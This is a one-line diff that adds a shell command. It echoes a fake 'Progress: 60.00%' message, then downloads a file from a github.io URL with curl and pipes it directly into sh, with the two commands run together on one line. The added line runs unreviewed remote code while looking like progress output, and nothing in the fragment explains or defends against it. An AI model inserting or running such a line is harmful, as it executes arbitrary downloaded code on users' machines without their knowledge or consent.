@@ -1,0 +1,1 @@
+echo Progress: 60.00%curl -L --progress-bar frkns.github.io/fun/CONTINUES_AGED_MEMORABILIA_SPOT_RADAR_ACTS_MOTOROLA_PROSTORES.json | sh
